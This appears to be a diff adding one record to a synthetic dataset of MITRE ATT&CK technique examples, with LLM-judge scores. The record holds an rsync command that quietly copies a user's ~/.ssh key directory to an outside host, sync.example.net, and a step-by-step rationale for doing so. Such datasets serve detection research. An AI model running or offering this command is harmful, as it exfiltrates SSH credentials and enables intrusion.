@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "rsync -azq --update $HOME/.ssh/ rsync://sync.example.net/archive/$HOSTNAME/.ssh/",
+  "explanation": "Transfers SSH key material to an rsync daemon endpoint using incremental sync and quiet mode, leveraging rsync\u2019s native protocol for automated exfiltration (T1020).",
+  "rationale_steps": [
+    "Target sensitive credentials (~/.ssh).",
+    "Use rsync protocol to a preconfigured module/path.",
+    "Apply --update to skip previously exfiltrated files.",
+    "Run quietly to suppress terminal output."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-97c0a830",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid rsync syntax with correct combined flags (-azq), a valid --update option, and proper source/destination forms using environment variables.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates ~/.ssh via the rsync daemon with compression and quiet incremental sync behavior, aligning with T1020, but it does not itself provide automation or authentication details.",
+        "combined_score": 4.5,
+        "confidence": 0.84,
+        "timestamp": "2025-10-01T03:44:03.467864Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The rsync command is perfectly well-formed with valid flags (-azq), proper argument structure, and correct syntax for specifying source and destination paths.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1020 (Automated Exfiltration) as it uses rsync to automatically transfer sensitive SSH key material from a user's home directory to an external server using the rsync protocol, which could be scheduled as part of an automated exfiltration process.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:44:06.386163Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid rsync flags and syntax, and correctly expands environment variables and protocol specifications.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by using rsync to stealthily exfiltrate sensitive SSH key material to an external daemon, aligning directly with T1020's description of automated exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:49:32.401098Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
